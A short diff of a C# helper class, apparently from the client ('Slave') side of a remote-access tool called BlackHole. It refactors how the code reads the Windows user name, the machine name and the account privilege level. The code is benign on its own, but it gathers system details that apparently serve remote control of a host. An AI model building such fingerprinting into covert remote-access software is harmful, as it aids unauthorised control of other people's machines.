@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Linq;
+using System.Reflection;
 using System.Security.Principal;
 using System.Text;
 using System.Threading.Tasks;
@@ -9,27 +10,37 @@ namespace BlackHole.Slave.Helper
 {
     public static class WindowsHelper
     {
-        public static string UserName => Environment.UserName;
-        public static string MachineName => Environment.MachineName;
-        public static string AccountType
+        static WindowsHelper()
         {
-            get
+            using (var identity = WindowsIdentity.GetCurrent())
             {
-                using (var identity = WindowsIdentity.GetCurrent())
+                if (identity != null)
                 {
-                    if (identity != null)
-                    {
-                        var principal = new WindowsPrincipal(identity);
-                        if (principal.IsInRole(WindowsBuiltInRole.Administrator))
-                            return "Admin";
-                        if (principal.IsInRole(WindowsBuiltInRole.User))
-                            return "User";
-                        if (principal.IsInRole(WindowsBuiltInRole.Guest))
-                            return "Guest";
-                    }
-                    return "Unknow";
+                    AccountType = "Unknow";
+                    var principal = new WindowsPrincipal(identity);
+                    if (principal.IsInRole(WindowsBuiltInRole.Administrator))
+                        AccountType = "Admin";
+                    else if (principal.IsInRole(WindowsBuiltInRole.User))
+                        AccountType = "User";
+                    else if (principal.IsInRole(WindowsBuiltInRole.Guest))
+                        AccountType = "Guest";
                 }
             }
+            UserName = Environment.UserName + $" ({AccountType})";
+            MachineName = Environment.MachineName;
+        }
+
+        public static string UserName
+        {
+            get;
+        }
+        public static string MachineName
+        {
+            get;
+        }
+        public static string AccountType
+        {
+            get;
         }
     }
 }
